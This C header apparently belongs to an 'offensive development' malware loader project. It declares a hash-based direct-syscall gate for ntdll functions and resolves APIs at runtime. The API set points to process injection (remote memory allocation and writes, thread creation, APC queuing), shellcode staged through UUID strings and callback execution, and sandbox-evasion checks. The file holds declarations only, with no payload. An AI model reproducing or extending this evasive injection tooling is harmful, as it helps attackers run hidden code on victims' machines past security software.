//
// Created by ronan on 11/20/24.
//

#ifndef OFFENSIVE_DEV_GATE_H
#define OFFENSIVE_DEV_GATE_H
#include <common.h>

typedef struct {
    PBYTE                       BaseAddress;
    PIMAGE_DOS_HEADER           ImgDosHdr;
    PIMAGE_NT_HEADERS           ImgNtHdrs;
    PIMAGE_EXPORT_DIRECTORY     ImgExpDir;
    PDWORD                      ArrayOfFunctions;
    PDWORD                      ArrayOfNames;
    PWORD                       ArrayOfOrdinals;
} MODULE, *PMODULE;

typedef struct {
    PVOID   Instruction;    // Address of a 'syscall' instruction in ntdll
    PBYTE   Address;        // Address of the syscall
    WORD    SSN;            // Syscall number
    ULONG   Hash;           // Hash of the syscall name
} Syscall, *PSyscall;


typedef struct {
    struct {
        //
        // ntdll.dll
        //
        Syscall SHASH_STR(NtAllocateVirtualMemory);
        Syscall SHASH_STR(NtProtectVirtualMemory);
        Syscall SHASH_STR(NtWriteVirtualMemory);
        Syscall SHASH_STR(NtCreateThreadEx);
        Syscall SHASH_STR(NtWaitForSingleObject);
        Syscall SHASH_STR(NtClose);
        //
        // kernel32.dll
        //
        D_API( LoadLibraryW, LoadLibraryW )
        D_API( WriteFile, WriteFile )
        D_API( GetStdHandle, GetStdHandle )
        D_API( CreateToolhelp32Snapshot, CreateToolhelp32Snapshot )
        D_API( Process32First, Process32First )
        D_API( Process32Next, Process32Next )
        D_API( OpenProcess, OpenProcess )
        D_API( GetProcAddress, GetProcAddress )
        D_API( Sleep, Sleep )
        D_API( GetModuleHandleA, GetModuleHandleA )
        D_API( ReadProcessMemory, ReadProcessMemory )
        D_API( WriteProcessMemory, WriteProcessMemory )
        D_API( VirtualAllocEx, VirtualAllocEx )
        D_API( VirtualProtectEx, VirtualProtectEx )
        D_API( VirtualFreeEx, VirtualFreeEx )
        D_API( GetLastError, GetLastError )
        D_API( CloseHandle, CloseHandle )
        D_API( CreateProcessA, CreateProcessA )
        D_API( QueueUserAPC, QueueUserAPC )
        D_API( ResumeThread, ResumeThread )
        D_API( VirtualAlloc, VirtualAlloc )
        D_API( EnumChildWindows, EnumChildWindows )
        D_API( VirtualAllocExNuma, VirtualAllocExNuma )
        D_API( FlsAlloc, FlsAlloc )
        //
        // user32.dll
        //
        D_API( wvsprintfA, wvsprintfA )
        //
        // RPCRT4
        //
        D_API( UuidFromStringA, UuidFromStringA )
    } Win32;

    struct {
        MODULE Ntdll;
        MODULE Kernel32;
        MODULE User32;
        MODULE RPCRT4;
    } Modules;
} GATE, *PGATE;

VOID InitializeGate();

VOID Unshuffle();

#endif //OFFENSIVE_DEV_GATE_H
